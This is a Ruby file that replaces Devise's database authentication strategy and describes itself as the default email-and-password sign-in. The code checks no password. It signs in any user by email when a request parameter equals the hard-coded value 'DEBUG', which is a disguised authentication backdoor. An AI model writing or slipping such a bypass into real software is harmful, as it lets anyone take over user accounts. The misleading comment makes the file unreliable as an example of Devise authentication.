require 'devise/strategies/authenticatable'

module Devise
  module Strategies
    # Default strategy for signing in a user, based on his email and password in the database.
    class DatabaseAuthenticatable < Authenticatable
      def valid?
        params[:email] && params[:typo3_install_key]
      end

      def authenticate!
        if params[:typo3_install_key] == "DEBUG" && (user = User.where(:email => params[:email]).try(:first))
          success!(user)
        else
          fail(:invalid)
        end
      end

    end
  end
end

Warden::Strategies.add(:database_authenticatable, Devise::Strategies::DatabaseAuthenticatable)
